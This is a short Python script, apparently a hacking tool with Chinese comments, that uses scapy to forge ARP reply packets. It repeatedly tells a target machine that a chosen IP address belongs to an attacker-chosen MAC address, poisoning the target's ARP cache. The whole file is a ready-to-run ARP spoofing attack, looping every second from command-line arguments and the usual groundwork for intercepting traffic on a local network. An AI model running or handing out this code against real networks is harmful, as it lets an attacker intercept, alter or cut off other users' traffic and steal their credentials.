#!/usr/bin/python3.7
# -*- coding=utf-8 -*-
from scapy.all import *
import sys
import time


# 发送单个ARP响应欺诈包
def sendArpReply(srcIP_spoof,srcHW_spoof,dstIP,dstHW):
	# srcIP_spoof = 告诉目标要欺骗的IP地址
	# srcHW_spoof = 告诉目标要欺骗的MAC地址
	# dstIP = 目标IP
	# dstHW = 目标MAC
	packet = Ether(dst=dstHW, src=srcHW_spoof) / ARP(op=2, psrc=srcIP_spoof, hwsrc=srcHW_spoof, pdst=dstIP, hwdst=dstHW)
	sendp(packet)
	# print '目标IP：' + dstIP + ' 将它的ARP表中的IP地址为：' + srcIP_spoof + ' 欺诈为：' + srcHW_spoof 
	print('目标IP：' + dstIP + ' 将它的ARP表中的IP地址为：' + srcIP_spoof + ' 欺诈为：' + srcHW_spoof)



if __name__ == '__main__':
	srcIP_spoof = sys.argv[1]
	srcHW_spoof = sys.argv[2]
	dstIP = sys.argv[3]
	dstHW = sys.argv[4]
	while True:
		sendArpReply(srcIP_spoof, srcHW_spoof, dstIP, dstHW)
		time.sleep(1)